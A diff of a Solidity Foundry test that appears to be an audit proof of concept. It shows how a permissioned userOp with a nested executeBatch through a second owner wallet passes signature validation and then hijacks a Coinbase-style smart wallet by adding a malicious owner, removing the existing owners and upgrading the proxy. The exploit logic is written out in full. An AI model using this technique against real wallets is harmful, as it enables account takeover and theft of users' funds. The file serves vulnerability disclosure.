@@ -60,27 +60,27 @@ contract Findings is Test, EntrypointRuntimeBytecode {
         vm.stopPrank();
         
         // deploy innocent smart contract wallets and initialize them with each other as owners
-        MockCoinbaseSmartWallet firstSmartWalletImpl = new MockCoinbaseSmartWallet(); // only victim ("first") wallet used as proxy for brevity, + to show malicious upgrade
-        MockCoinbaseSmartWallet firstSmartWallet = MockCoinbaseSmartWallet(payable(address(new ERC1967Proxy(address(firstSmartWalletImpl), ''))));
-        MockCoinbaseSmartWallet secondSmartWallet = new MockCoinbaseSmartWallet();
-        bytes[] memory firstSmartWalletOwners = new bytes[](2);
-        firstSmartWalletOwners[0] = abi.encode(owner);
-        firstSmartWalletOwners[1] = abi.encode(address(secondSmartWallet));
-        firstSmartWallet.initialize(firstSmartWalletOwners);
-        bytes[] memory secondSmartWalletOwners = new bytes[](1);
-        secondSmartWalletOwners[0] = abi.encode(address(firstSmartWallet));
-        secondSmartWallet.initialize(secondSmartWalletOwners);
+        MockCoinbaseSmartWallet victimWalletImpl = new MockCoinbaseSmartWallet(); // only victim ("first") wallet used as proxy for brevity, + to show malicious upgrade
+        MockCoinbaseSmartWallet victimWallet = MockCoinbaseSmartWallet(payable(address(new ERC1967Proxy(address(victimWalletImpl), ''))));
+        MockCoinbaseSmartWallet pivotWallet = new MockCoinbaseSmartWallet();
+        bytes[] memory victimWalletOwners = new bytes[](2);
+        victimWalletOwners[0] = abi.encode(owner);
+        victimWalletOwners[1] = abi.encode(address(pivotWallet));
+        victimWallet.initialize(victimWalletOwners);
+        bytes[] memory pivotWalletOwners = new bytes[](1);
+        pivotWalletOwners[0] = abi.encode(address(victimWallet));
+        pivotWallet.initialize(pivotWalletOwners);
 
         // enable permissions on both wallets by adding PermissionManager singleton as owner to each
-        vm.prank(address(firstSmartWallet));
-        secondSmartWallet.addOwnerAddress(address(permissionManager));
-        vm.prank(address(secondSmartWallet));
-        firstSmartWallet.addOwnerAddress(address(permissionManager));
+        vm.prank(address(victimWallet));
+        pivotWallet.addOwnerAddress(address(permissionManager));
+        vm.prank(address(pivotWallet));
+        victimWallet.addOwnerAddress(address(permissionManager));
 
         // create dummy permission with approval
-        PermissionManager.Permission memory permission = _createPermissionWithApproval(firstSmartWallet);
+        PermissionManager.Permission memory permission = _createPermissionWithApproval(victimWallet);
 
-        // create malicious owner wallet to be added via nested call to `secondSmartWallet.executeBatch()`
+        // create malicious owner wallet to be added via nested call to `pivotWallet.executeBatch()`
         address maliciousOwner = address(payable(new MockCoinbaseSmartWallet()));
 
         // deposit funds on behalf of paymaster
@@ -89,16 +89,16 @@ contract Findings is Test, EntrypointRuntimeBytecode {
         entrypoint.call{value: 10 ether}('');
 
         // form malicious `userOp` containing nested `executeBatch()` call
-        UserOperation memory userOp = _createUserOpNestedExecuteBatch(permission, address(paymaster), payable(address(firstSmartWallet)), address(secondSmartWallet), maliciousOwner);
+        UserOperation memory userOp = _createUserOpNestedExecuteBatch(permission, address(paymaster), payable(address(victimWallet)), address(pivotWallet), maliciousOwner);
 
-        withdrawRequest.signature = _getSignature(paymaster.getHash(address(firstSmartWallet), withdrawRequest), ownerPk);
+        withdrawRequest.signature = _getSignature(paymaster.getHash(address(victimWallet), withdrawRequest), ownerPk);
         userOp.paymasterAndData = abi.encodePacked(paymaster, abi.encode(withdrawRequest));
 
         // `entryPoint.getUserOpHash(userOp)`
         (, bytes memory ret) = entrypoint.call(bytes.concat(hex'a6193531', abi.encode(userOp)));
         bytes32 userOpHash = bytes32(ret);
 
-        userOp.signature = firstSmartWallet.wrapSignature(0, _getSignature(userOpHash, ownerPk));
+        userOp.signature = victimWallet.wrapSignature(0, _getSignature(userOpHash, ownerPk));
 
         PermissionManager.PermissionedUserOperation memory permissionedUserOp;
         permissionedUserOp.userOp = userOp;
@@ -107,13 +107,13 @@ contract Findings is Test, EntrypointRuntimeBytecode {
         permissionedUserOp.userOpSignature = _getSignature(userOpHash, permmissionSignerPk);
         permissionedUserOp.userOpCosignature = _getSignature(userOpHash, cosignerPk);
 
-        // malicious `userOp` passes `isValidSignature()` check
-        // bytes4 magicValue = permissionManager.isValidSignature(userOpHash, abi.encode(permissionedUserOp));
-        // assertEq(magicValue, bytes4(0x1626ba7e));
+        // malicious permissioned `userOp` passes `isValidSignature()` check
+        bytes4 magicValue = permissionManager.isValidSignature(userOpHash, abi.encode(permissionedUserOp));
+        assertEq(magicValue, bytes4(0x1626ba7e));
 
-        // malicious `userOp` passes `validateUserOp()` check
-        // vm.prank(entrypoint);
-        // firstSmartWallet.validateUserOp(userOp, userOpHash, 0);
+        // malicious permissioned `userOp` passes `validateUserOp()` check
+        vm.prank(entrypoint);
+        victimWallet.validateUserOp(userOp, userOpHash, 0);
         
         // execute `userOp` which hijacks the first CB smart wallet by leveraging its other owner
         UserOperation[] memory ops = new UserOperation[](1);
@@ -122,10 +122,10 @@ contract Findings is Test, EntrypointRuntimeBytecode {
         entrypoint.call(handleOpsCall);
     }
 
-    function _createUserOpNestedExecuteBatch(PermissionManager.Permission memory permission, address paymaster, address payable firstSmartWallet, address secondSmartWallet, address maliciousOwner) internal returns (UserOperation memory) {
+    function _createUserOpNestedExecuteBatch(PermissionManager.Permission memory permission, address paymaster, address payable victimWallet, address pivotWallet, address maliciousOwner) internal returns (UserOperation memory) {
         UserOperation memory userOp;
 
-        userOp.sender = firstSmartWallet;
+        userOp.sender = victimWallet;
         // dummy placeholders
         userOp.nonce = 0;
         userOp.callGasLimit = callGasLimit;
@@ -141,20 +141,20 @@ contract Findings is Test, EntrypointRuntimeBytecode {
         // populate `calls` with a nested ExecuteBatch call to the second smart wallet owner which "reenters" the first smart wallet with malicious owner changes and an upgrade
         CoinbaseSmartWallet.Call[] memory nestedCalls = new CoinbaseSmartWallet.Call[](4);
         bytes memory maliciousAddOwnerCall = abi.encodeWithSelector(MultiOwnable.addOwnerAddress.selector, maliciousOwner);
-        nestedCalls[0] = CoinbaseSmartWallet.Call(firstSmartWallet, 0, maliciousAddOwnerCall);
-        bytes memory ownerAtIndex0 = CoinbaseSmartWallet(firstSmartWallet).ownerAtIndex(0);
+        nestedCalls[0] = CoinbaseSmartWallet.Call(victimWallet, 0, maliciousAddOwnerCall);
+        bytes memory ownerAtIndex0 = CoinbaseSmartWallet(victimWallet).ownerAtIndex(0);
         bytes memory maliciousRemoveOwnerCall0 = abi.encodeWithSelector(MultiOwnable.removeOwnerAtIndex.selector, 0, ownerAtIndex0);
-        nestedCalls[1] = CoinbaseSmartWallet.Call(firstSmartWallet, 0, maliciousRemoveOwnerCall0);
+        nestedCalls[1] = CoinbaseSmartWallet.Call(victimWallet, 0, maliciousRemoveOwnerCall0);
         bytes memory maliciousUpgradeCall = abi.encodeWithSelector(UUPSUpgradeable.upgradeToAndCall.selector, maliciousOwner, '');
-        nestedCalls[2] = CoinbaseSmartWallet.Call(firstSmartWallet, 0, maliciousUpgradeCall);
-        bytes memory ownerAtIndex1 = CoinbaseSmartWallet(firstSmartWallet).ownerAtIndex(1);
+        nestedCalls[2] = CoinbaseSmartWallet.Call(victimWallet, 0, maliciousUpgradeCall);
+        bytes memory ownerAtIndex1 = CoinbaseSmartWallet(victimWallet).ownerAtIndex(1);
         bytes memory maliciousRemoveOwnerCall1 = abi.encodeWithSelector(MultiOwnable.removeOwnerAtIndex.selector, 1, ownerAtIndex1);
-        nestedCalls[3] = CoinbaseSmartWallet.Call(firstSmartWallet, 0, maliciousRemoveOwnerCall1);
+        nestedCalls[3] = CoinbaseSmartWallet.Call(victimWallet, 0, maliciousRemoveOwnerCall1);
 
         bytes memory nestedExecuteBatchData = abi.encodeWithSelector(CoinbaseSmartWallet.executeBatch.selector, nestedCalls);
         
         // calls == [<ValidBeforeCalls>, <ExecuteBatch(<AddMaliciousOwnerCall>,<RemoveExistingOwner0>,<MaliciousUpgrade>,<RemoveExistingOwner1>)>]
-        calls[1] = CoinbaseSmartWallet.Call(secondSmartWallet, 0, nestedExecuteBatchData);
+        calls[1] = CoinbaseSmartWallet.Call(pivotWallet, 0, nestedExecuteBatchData);
 
         userOp.callData = abi.encodeWithSelector(
             CoinbaseSmartWallet.executeBatch.selector,
